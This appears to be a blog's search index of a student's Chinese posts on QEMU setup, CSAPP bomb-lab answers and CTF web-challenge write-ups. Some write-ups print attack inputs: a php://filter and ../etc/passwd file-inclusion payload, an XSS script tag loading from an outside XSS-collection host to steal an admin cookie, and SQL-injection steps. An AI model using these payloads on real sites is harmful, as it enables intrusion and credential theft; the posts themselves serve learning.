<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>记录人生平静的一天</title>
    <link href="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%BA%BA%E7%94%9F%E5%B9%B3%E9%9D%99%E7%9A%84%E4%B8%80%E5%A4%A9/"/>
    <url>/2020/03/28/%E8%AE%B0%E5%BD%95%E4%BA%BA%E7%94%9F%E5%B9%B3%E9%9D%99%E7%9A%84%E4%B8%80%E5%A4%A9/</url>
    
    <content type="html"><![CDATA[<p>试问qemu突然启动不了是什么体验？之前装的时候没啥bug出现还窃喜不已，然而上天果然是公平的，在我顺着错误提示东改西改后，终于！虚拟机也打不开了。真好，人生原来可以如此的平静，原来这就是大彻大悟后无欲无求的感觉吗？</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>MIT6.828 环境搭建</title>
    <link href="/2020/03/27/MIT6.828%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2020/03/27/MIT6.828%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<p>总的来说，需要构建x86仿真器QEMU和一个编译器工具链。具体步骤如下：<br>1.安装linux虚拟机，如果是64位计算机的话先安装32位支持库，输入：<br><code>sudo apt-get install gcc-multilib</code><br>2.在终端测试工具链是否可行，首先输入<code>Objdump -i</code>，输出第二行应为elf32-i386。然后输入<code>gcc -m32 -print-libgcc-file-name</code>,如果两个命令都成功，就说明无需再编译工具链，具体如下图所示：<br><img src="https://img-blog.csdnimg.cn/20200327220518122.png" srcset="/img/loading.gif" alt="">)<img src="https://img-blog.csdnimg.cn/2020032722055989.png" srcset="/img/loading.gif" alt=""><br>3.下载qemu前，首先安装libsdl1.2-dev，libtool-bin，libglib2.0-dev，libz-dev和libpixman-1-dev几个包。<br>4.下载qemu，输入<br><code>git clone https://github.com/mit-pdos/6.828-qemu.git qemu</code> 吐槽一句，下载是真慢啊！<br>5.配置源代码，输入<code>./configure --disable-kvm --disable-werror [--prefix=自选路径] [--target-list=”i386-softmmu x86_64-softmmu”],</code>然后运行<code>make &amp;&amp; make install</code></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>拆弹进程记录3-5</title>
    <link href="/2020/03/23/%E6%8B%86%E5%BC%B9%E8%BF%9B%E7%A8%8B%E8%AE%B0%E5%BD%953-5/"/>
    <url>/2020/03/23/%E6%8B%86%E5%BC%B9%E8%BF%9B%E7%A8%8B%E8%AE%B0%E5%BD%953-5/</url>
    
    <content type="html"><![CDATA[<h2 id="第三阶段"><a href="#第三阶段" class="headerlink" title="第三阶段"></a>第三阶段</h2><p><img src="https://img-blog.csdnimg.cn/20200323231741610.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpYW9xaW5nc2hhbg==,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt=""><br>跳转查询地址<br><img src="https://img-blog.csdnimg.cn/20200323232331581.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpYW9xaW5nc2hhbg==,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt=""><br><img src="https://img-blog.csdnimg.cn/20200323231804880.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpYW9xaW5nc2hhbg==,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt=""><br><img src="https://img-blog.csdnimg.cn/2020032323182238.png" srcset="/img/loading.gif" alt=""><br>第三阶段首先找到输入格式是“%d %c %d”，输入的第一个数需要保证在2-7之间，并根据输入的这个数来进行跳转。然后需要保证输入的第三个数字等于0x38b即907，并进一步跳转，判断第二次输入的字符和al寄存器所存是否相等，相等即通关。最后结果是”3 l 907”</p><h2 id="第四阶段"><a href="#第四阶段" class="headerlink" title="第四阶段"></a>第四阶段</h2><p><img src="https://img-blog.csdnimg.cn/20200323232431851.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpYW9xaW5nc2hhbg==,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt=""><br><img src="https://img-blog.csdnimg.cn/20200323232448500.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpYW9xaW5nc2hhbg==,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt=""><br>第四阶段最关键的递归调用程序我还有点迷糊，只看出来了如果第二个数是4，第一个数就是4的倍数，然后试出来的48和4。</p><h2 id="第五阶段"><a href="#第五阶段" class="headerlink" title="第五阶段"></a>第五阶段</h2><p><img src="https://img-blog.csdnimg.cn/20200323232835858.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpYW9xaW5nc2hhbg==,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt=""><br>第五阶段就是首先知道输入字符串的长度需要为6，然后进行一个循环，由ax寄存器的值当作循环变量，每次循环依次将输入的单个字符的ascII码的低四位存到cx寄存器中，并把0x804a260+4<em>ecx里存的数值累次加到dx寄存器上。六次循环后判断dx里的值是否为52，如果相等则通关。<br>52=10+10+10+10+10+2，当ecx里的值为0，0x804a260+4</em>ecx即0x804a260里存的是2，当ecx里的值为1时，0x804a264里存的是10，所以就找二进制低四位为0000和0001的字符，找到q和p符合条件。最后结果为qqqqqp</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>拆弹进程记录1-2</title>
    <link href="/2020/03/21/%E6%8B%86%E5%BC%B9%E8%BF%9B%E7%A8%8B%E8%AE%B0%E5%BD%951-2/"/>
    <url>/2020/03/21/%E6%8B%86%E5%BC%B9%E8%BF%9B%E7%A8%8B%E8%AE%B0%E5%BD%951-2/</url>
    
    <content type="html"><![CDATA[<p><img src="https://img-blog.csdnimg.cn/20200321215122818.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpYW9xaW5nc2hhbg==,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt=""><br>第一阶段是将输入的内容和0x804a1c4存的内容相比较，相等则可以通过。<br><img src="https://img-blog.csdnimg.cn/20200321215449529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpYW9xaW5nc2hhbg==,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt=""><br>第二阶段要求输入六个数字，并且输入的第一个数字必须为1。整个程序经历五次循环，将循环变量从1开始相加，或者说做乘2运算（eax+eax），每次循环都要和相应次序输入的数字进行比较，必须保证都相等才能避免爆炸。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>第二阶段 -第一次记录</title>
    <link href="/2020/03/20/%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5%20-%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/03/20/%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5%20-%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p>装了一天的linux虚拟机，疲于修改各种奇奇怪怪的小bug。现在就有两个感悟：1.删除重装大法好，菜鸡必备。2.你永远不知道之前嫌弃占空间删掉的软件什么时候会再下回来，能留着就留着吧，重新下怪麻烦的。<br>简单说下安装过程吧，我用的virtualbox+ubuntu（用vb其实是因为穷，免费使用它不香吗？)<br>具体安装过程可见：<a href="https://www.jianshu.com/p/e838cd947eff" target="_blank" rel="noopener">虚拟机安装过程</a><br>设置共享文件夹可能会有点问题，自动挂载行不通的话还是莫要强求了，直接用手动挂载吧。具体方法可见<a href="https://www.jianshu.com/p/39327c9ea368" target="_blank" rel="noopener">共享文件夹的几种设置方法</a><br>全都装完后想执行一下bomb，结果？？？一直提醒我没有那个文件或目录。整了好久才知道是因为我的ubuntu是64位的，没有32位的运行库。在终端安装一下运行库就行，具体如下：</p><pre><code class="python">sudo apt-get install ia32-libs</code></pre><p>如果不行，说没有可用的软件包，然而下列软件包会取代它，就输入：</p><pre><code class="python">sudo apt-get install lib32z1</code></pre><p>另外，找到了一篇讲linux执行可执行文件的具体过程，讲的挺好：<a href="https://blog.csdn.net/mazongshan1/article/details/37936971?depth_1-utm_source=distribute.pc_relevant.none-task&utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">linux可执行文件执行过程</a><br>万事大吉后用objdump反汇编了一下bomb，整整齐齐蹦出来的汇编语言直接闪瞎了我的狗眼，明天开始要好好复习一下汇编语言了啊！</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>第八次记录</title>
    <link href="/2020/03/19/%E7%AC%AC%E5%85%AB%E6%AC%A1%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/03/19/%E7%AC%AC%E5%85%AB%E6%AC%A1%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="题目考查点"><a href="#题目考查点" class="headerlink" title="题目考查点"></a>题目考查点</h2><p>1.php文件包含漏洞<br>2.使用php://filter绕过限制</p><h2 id="涉及知识点"><a href="#涉及知识点" class="headerlink" title="涉及知识点"></a>涉及知识点</h2><p>1.php文件包含漏洞指服务器通过php的特性去包含任意文件时，由于要包含的这个文件来源过滤不严，从而可以去包含一个恶意文件，导致执行了非预期的代码，从而产生安全漏洞。文件包含漏洞的一般特征如下：<br>?page=a.php<br>?home=a.html<br>?file=content<br>具体可见：<br><a href="https://blog.csdn.net/SKI_12/article/details/60882602?fps=1&locationNum=2" target="_blank" rel="noopener">php文件包含漏洞</a><br><a href="https://www.jianshu.com/p/3dc97deec491" target="_blank" rel="noopener">文件包含漏洞的几种利用方法</a><br><a href="https://blog.csdn.net/xysoul/article/details/46689049" target="_blank" rel="noopener">文件包含漏洞详解</a><br>2.使用php封装协议读取文件，一般可以使用两种方式：</p><pre><code class="python">?page=php://filter/read=convert.base64-encode/resource=index.php</code></pre><pre><code class="python">?page=../../../../../../etc/passwd</code></pre><p>3.php://filter是php中特有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取。其中，resource参数指定了要过滤的数据流，read或者write参数都可以设定一个或多个过滤器，以符号|分隔。其主要应用包括利用base64获得源码或者通过读写编码实行绕过操作等，本题就是利用它将引发冲突的文件流进行编码处理。<br>具体可见：<br><a href="https://blog.csdn.net/wy_97/article/details/77432002" target="_blank" rel="noopener">浅述filter妙用</a></p><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>1.在url后面输入<br><code>?page=php://filter/read=convert.base64-encode/resource=flag</code>，先将可能引发限制的php代码用base64编码，从而绕过限制。<br>2.将页面出现内容进行base64解码，得到flag。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>第七次记录</title>
    <link href="/2020/03/18/%E7%AC%AC%E4%B8%83%E6%AC%A1%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/03/18/%E7%AC%AC%E4%B8%83%E6%AC%A1%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="题目考查点"><a href="#题目考查点" class="headerlink" title="题目考查点"></a>题目考查点</h2><p>1.Proof of work概念<br>2.Xss注入操作<br>3.修改cookie操作</p><h2 id="涉及知识点"><a href="#涉及知识点" class="headerlink" title="涉及知识点"></a>涉及知识点</h2><p>1.proof of work,即工作量证明。简单理解就是一份证明，来确认你做过一定量的工作。或者说，只有针对某个协议或者函数进行一定量的运算得出结果，才可以取得证明。其核心特征是不对称性：工作对于请求方是适中的，对于验证方则是易于验证的。详细介绍可见<a href="https://blog.csdn.net/lucky_greenegg/article/details/52530570" target="_blank" rel="noopener">pow介绍</a><br>2.XSS即跨站脚本攻击，利用对输入数据过滤的不严格，导致程序执行了用户在页面中输入的恶意代码，合法用户在之后访问的时候，这些恶意代码会被执行。<br>详细介绍可见：<br><a href="https://blog.csdn.net/weixin_43843847/article/details/89353390?depth_1-utm_source=distribute.pc_relevant.none-task&utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">XSS入门</a><br><a href="https://blog.csdn.net/sdb5858874/article/details/87913903?depth_1-utm_source=distribute.pc_relevant.none-task&utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">XSS进阶教程</a><br>3.XSS平台：在xss平台上创建项目后，在网站有xss的地方插入项目中的代码，执行的时候就会把相应的信息发送到xss平台上，可以用来查看cookie、账号等信息。详细介绍可见：<a href="https://www.zhihu.com/question/26964939" target="_blank" rel="noopener">xss平台作用</a></p><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>1.home页面有留言板和<code>substr(md5(‘proof of work’),0,6)===’sdsaw1’</code>的字样，留言板应该是输入xss代码的地方，后一句代码的意思是找到某个字符串经md5编码后的前六个字符和sdsaw1保证强相等。同时，admin页面上提示需要使用管理员的cookie，所以获得管理员的cookie是关键。<br>2.根据pow的概念，直接用暴力枚举的方法找到符合条件的数字字符串。提交后出现同时在xss平台上创建项目，将项目中提示的代码<code>&lt;sCRiPtsRC=http://xss.fbisb.com/TMVX&gt;&lt;/sCrIpT&gt;</code>复制到留言板中。提交后显示如下‘your message has been in the queue of admin readlist’，也就说明了管理员方已经执行了xss代码，cookie等相关信息应该已经发送到了xss平台上。在平台上接收到的cookie内容为<code>cookie:token=a9011a0e551f181c1c526881befac44d</code><br>3.在admin页面打开chrome浏览器自带的开发者工具，修改cookie，刷新页面出现flag。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>第六次记录</title>
    <link href="/2020/03/17/%E7%AC%AC%E5%85%AD%E6%AC%A1%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/03/17/%E7%AC%AC%E5%85%AD%E6%AC%A1%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="题目考查点"><a href="#题目考查点" class="headerlink" title="题目考查点"></a>题目考查点</h2><p>1.php中stripos()函数、file_put_contents()函数应用<br>2.数组绕过方法</p><h2 id="涉及知识点"><a href="#涉及知识点" class="headerlink" title="涉及知识点"></a>涉及知识点</h2><p>1.PHP中stripos()函数用来查找字符串在另一字符串中第一次出现的位置，并不区分大小写。返回值为字符串第一次出现的位置，如果没有找到字符串返回false。详细介绍可见<a href="https://www.w3school.com.cn/php/func_string_stripos.asp" target="_blank" rel="noopener">stripos函数</a><br>2.file_put_contents()函数可用来把字符串、数组或者数据流写入文件中，返回值为写入到文件内数据的字节数。如果写入的是数组，会利用<code>join(‘’,$array)</code>转化为字符串。详细介绍可见<a href="https://www.w3school.com.cn/php/func_filesystem_file_put_contents.asp" target="_blank" rel="noopener">file_put_contents函数</a></p><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>1.在初始界面随便输入一串数，进入一个新的界面。上面的php代码要求以get请求提交的content字符串中不应该包括’php’或者’&lt;’，如果满足了这个条件就会将content内容存到filename中。<br>2.输入满足条件的字符串，config.php页面中只会出现所输的内容。猜测需要在filename中存入’php’或者’&lt;’。遂尝试使用数组绕过的方法，在url后面添加<code>content[]=’php’</code>或者<code>content[]=’&lt;’</code>。此时config.php页面中出现flag。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>第五次记录 </title>
    <link href="/2020/03/17/%E7%AC%AC%E4%BA%94%E6%AC%A1%E8%AE%B0%E5%BD%95%20/"/>
    <url>/2020/03/17/%E7%AC%AC%E4%BA%94%E6%AC%A1%E8%AE%B0%E5%BD%95%20/</url>
    
    <content type="html"><![CDATA[<h2 id="题目考查点"><a href="#题目考查点" class="headerlink" title="题目考查点"></a>题目考查点</h2><p>1.php类型比较<br>2.如何做到变量原值不同但利用md5或sha1编码后结果相同</p><h2 id="涉及知识点"><a href="#涉及知识点" class="headerlink" title="涉及知识点"></a>涉及知识点</h2><p>1.php变量比较包含松散比较和严格比较。其中，松散比较指使用两个等号比较，只比较值，不比较类型。严格比较指用三个等号比较，除了比较值，也比较类型。详情可见<a href="https://www.runoob.com/php/php-types-comparisons.html" target="_blank" rel="noopener">php入门之类型比较</a><br>2.php中sha1()函数计算字符串的SHA-1散列，md5()函数则计算字符串的MD5散列。<br>3.经过MD5运算后结果为0的字符串，编码后需保证0e<strong>**</strong>的形式，换成数字意思为0乘10的n次方，故结果为0。例如240610708 和 QNKCDZO均符合，实际上符合的字符串很多，就不一一赘述了。<br>4.保证变量不同但SHA-1编码后相同，利用数组绕过的方法。因为md5和sha1对一个数组进行加密都将返回NULL，而NULL===NULL返回true。还有一些php黑魔法可见以下链接：<br><a href="https://blog.csdn.net/nzjdsds/article/details/82019297" target="_blank" rel="noopener">ctf中php总结</a><br><a href="https://blog.csdn.net/weixin_30539835/article/details/99669583" target="_blank" rel="noopener">php常见考点</a><br><a href="https://www.cnblogs.com/xishaonian/p/7628152.html" target="_blank" rel="noopener">php黑魔法总结</a></p><h2 id="做题步骤"><a href="#做题步骤" class="headerlink" title="做题步骤"></a>做题步骤</h2><p>1.观察所给代码，使用get请求。并且只要同时满足<code>md5($test)==‘0’</code><br><code>sha1($_GET[[‘name’])===sha1($_GET[‘password’])</code><br>以上两个条件即可。<br>2.在url后部添加<code>test=240610708&amp;name[]=1&amp;password[]=2</code>,可得到flag信息。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>第四次记录</title>
    <link href="/2020/03/16/%E7%AC%AC%E5%9B%9B%E6%AC%A1%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/03/16/%E7%AC%AC%E5%9B%9B%E6%AC%A1%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="题目考查点"><a href="#题目考查点" class="headerlink" title="题目考查点"></a>题目考查点</h2><p>Sql手工注入   </p><h2 id="涉及知识点"><a href="#涉及知识点" class="headerlink" title="涉及知识点"></a>涉及知识点</h2><p>1.注入点寻找<br>2.判断字段长度<br>3.判断字段位置<br>4.查询数据库名、表名、表中的字段和字段信息 </p><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>以下解题步骤主要参考了这两篇文章<a href="https://www.cnblogs.com/conquer-vv/p/11307682.html" target="_blank" rel="noopener">https://www.cnblogs.com/conquer-vv/p/11307682.html</a><br><a href="https://blog.csdn.net/qq_39353923/article/details/82901903" target="_blank" rel="noopener">https://blog.csdn.net/qq_39353923/article/details/82901903</a><br>说实话，我做这个题就是照着上面文章来的，搜sql手工注入结果找到了一个差不多的题，做出来这个题很是胜之不武，也没啥成就感。具体步骤如下：<br>1.找注入点，判断是否存在注入点常用套路是输入语句’、and 1=1或and 1=2,来判断网站是否存在注入点。尝试在正常数据后加上单引号，发现数据为空，加上注释符(注释符:#,–+ , //, – )后发现依旧可以正常输出,那么可以判断存在注入点。<br>2.用order by 来判断字段长度。<br>3.使用union或者union all将SQL语句联合起来判断字段位置，并可以查询数据库名、表名、表中的字段和字段信息。最终在字段信息中找到flag</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>第三次记录</title>
    <link href="/2020/03/14/%E7%AC%AC%E4%B8%89%E6%AC%A1%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/03/14/%E7%AC%AC%E4%B8%89%E6%AC%A1%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="题目考查点"><a href="#题目考查点" class="headerlink" title="题目考查点"></a>题目考查点</h2><p>1.对session对象的应用，以保证会话信息的一致性。<br>2.如何正确解析和提取HTML／XML数据<br>3.base64正确解码方式<br>4.对SVG图像的处理 </p><h2 id="涉及知识点"><a href="#涉及知识点" class="headerlink" title="涉及知识点"></a>涉及知识点</h2><p>1.创建一个session对象来发请求，那么每次发请求用的都是这个会话对象，能够保存之前的会话信息，以保证会话信息的一致性。<br>2.BeautifulSoup支持Python标准库中的HTML解析器，借助它可以实现对html/xml语言的解析与提取，本题使用方法为BeautifulSoup(markup,”html.parser”)。具体标签内容的提取方法可参照 <a href="http://www.jsphp.net/python/show-24-214-1.html" target="_blank" rel="noopener">http://www.jsphp.net/python/show-24-214-1.html</a><br>3.SVG为可缩放矢量图形，并使用XML格式来定义图像。<text>元素用于定义文本，其中x决定此文本在横轴的位置，y决定纵轴的位置。具体介绍可见<a href="https://www.runoob.com/svg/svg-text.html" target="_blank" rel="noopener">https://www.runoob.com/svg/svg-text.html</a> </p><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>1.首先查看网页源代码，观察到data:image/svg+xml;base64的字眼。<br>2.对img标签内描述图像的内容进行提取，并利用Base64解码。<br>3.解码得到svg描述的原图像，为了得到按图片从左到右顺序排序的字母序列，利用x的大小对标签内容进行排序。<br>4.得到验证码内容，利用get请求提交。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>第二次记录 </title>
    <link href="/2020/03/12/%E7%AC%AC%E4%BA%8C%E6%AC%A1%E8%AE%B0%E5%BD%95%20/"/>
    <url>/2020/03/12/%E7%AC%AC%E4%BA%8C%E6%AC%A1%E8%AE%B0%E5%BD%95%20/</url>
    
    <content type="html"><![CDATA[<p>做了一天多终于搞出来了，有点沮丧，自己需要学的有好多好多好多好多啊。<br>讲讲题目的思路吧，题目要求快速计算出一串式子的结果。提示说思考服务器怎样知道获得算式和提交答案的是一个人，然而我还是没啥思路，好吧，起码大方向给了。就看了提示里的Python requests库，又查了查相关资料，发现直接使用requests调用请求方法发送请求，每次都会创建一个新session（会话对象），没有之前请求的cookies信息。直接创建一个session对象来发请求，那么每次发请求用的都是这个会话对象，所有能够保存之前的会话信息（cookies数据），就能够保证获得算式和提交答案的都是一个人了。session其实是一个会话类，requests的所有请求方法，底层都是调用的这个类的对象。看来是要用python来写啊，这样就有初步的解决思路了。<br>但是咋计算那串式子呢？首先肯定得从所有的字符串中提取出来，那就用正则表达式匹配试试吧，尴尬的是我正则表达式忘得差不多了，只能再查资料学习了。正则表达式中，+号表示前面的字符必须至少出现一次，*号表示字符可以不出现，也可以出现一次或者多次，？号表示前面的字符最多只可以出现一次。特殊字符需要在钱买呢加上一个\进行转义。python的re模块有全部的正则表达式功能，其中，re.match函数从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，就返回none。re.search则是扫描整个字符串并返回第一个成功的匹配。两者都可以用group(num)或者group()匹配对象函数来获取匹配表达式。 一开始写的表达式一直匹配的不对，看了看应该是空格匹配有些不太对，怎么整也没整好，就偷懒把所有空格都替换了，so sad。好不容易把式子匹配完，并用eavl函数计算出结果。此时的我犯了一个很蠢的错误，想用post请求来提交数据（想当然的脑回路不要有啊），一直不对。纠结了好久终于想起来再去看看网页源代码，扫了一眼，顿时虎躯一震，想捶死自己的心都有了，原来是要用get请求啊！python里requests模块的get方法有几个常用的参数，url-接口地址，headers-定制请求头，params-传递测试接口要用的参数，用python中的字典形式（key:value）来进行参数的传递，timeout-设置接口连接的最大时间，超过该时间会出现超时错误。本题只使用了url和params两个参数。慢慢修改后，最后终于整出来了。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>第一次记录</title>
    <link href="/2020/03/11/%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/03/11/%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p>@<a href="这里写自定义目录标题">TOC</a></p><h2 id="第一次记录"><a href="#第一次记录" class="headerlink" title="第一次记录"></a>第一次记录</h2><p>最简单的白给题-simple HTTP method，测试的get和post的用法。<br>第一个是关于get的题目，就我而言第一眼看到是懵逼的，以前完全没接触过这种骨骼清奇的题目。看了看网页的源代码，意识到这可能和get变量用法有关，只要想办法把key值设置成areyousure应该就行了。于是就去查相关用法。查了之后发现get传输的变量直接显示在URL之中，所以直接在网址后面加上？key=areyousure就可以了。?代表URL的结尾与请求参数的开始。<br>另一个是关于Post的题目，但是用post方法的表单发送的信息，对任何人都是不可见的，自然也不会直接显示在URL中。害，这可咋整。遂又在网上找处理方法，找到了一个在线http接口测试工具，把网址，参数key，参数值areyousure输入，得到了flag。<br>两个最简单的白给题做下来，不禁对自己的菜鸡水平有了更深层次的理解。还是要多努力啊！</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
